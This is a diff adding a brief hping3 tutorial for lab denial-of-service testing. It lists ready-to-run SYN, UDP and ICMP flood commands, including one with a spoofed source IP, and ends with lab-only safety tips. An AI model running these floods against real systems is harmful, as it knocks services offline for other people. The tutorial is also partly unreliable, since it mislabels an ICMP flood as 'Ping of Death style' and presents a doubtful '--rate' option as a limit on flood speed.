@@ -1,0 +1,89 @@
+1. Check if Hping3 is Installed
+hping3 --version
+
+
+If it’s not installed:
+
+sudo apt update && sudo apt install hping3 -y
+
+2. Basic Syntax
+hping3 [options] [host]
+
+
+Example:
+
+hping3 -S 192.168.1.100 -p 80
+
+
+-S → Sends TCP SYN packets.
+
+192.168.1.100 → Target IP.
+
+-p 80 → Target port (HTTP in this case).
+
+3. Common DoS Testing Commands
+A. SYN Flood Attack
+sudo hping3 -S --flood -V -p 80 192.168.1.100
+
+
+-S → SYN flag.
+
+--flood → Sends packets as fast as possible.
+
+-V → Verbose mode (shows packet count).
+
+-p 80 → Target port.
+
+B. UDP Flood
+sudo hping3 --udp --flood -p 53 192.168.1.100
+
+
+--udp → Use UDP instead of TCP.
+
+-p 53 → DNS port.
+
+C. ICMP Flood (Ping of Death style)
+sudo hping3 --icmp --flood 192.168.1.100
+
+
+--icmp → ICMP Echo Request packets.
+
+4. Controlling Packet Rate
+
+If you want to limit packet speed (avoid overloading your lab machine):
+
+sudo hping3 -S -p 80 --flood --rate 100 192.168.1.100
+
+
+--rate 100 → Send 100 packets per second.
+
+5. Crafting Custom Packets
+
+Example with spoofed source IP:
+
+sudo hping3 -S -a 10.0.0.99 -p 80 --flood 192.168.1.100
+
+
+-a 10.0.0.99 → Fake source IP (for testing firewall rules in lab).
+
+6. Stopping the Attack
+
+Press:
+
+CTRL + C
+
+
+Hping3 will show statistics of packets sent.
+
+7. Safety Tips
+
+Run only on isolated lab networks or virtual machines.
+
+Monitor effects using:
+
+sudo tcpdump -i eth0
+
+
+or:
+
+iftop
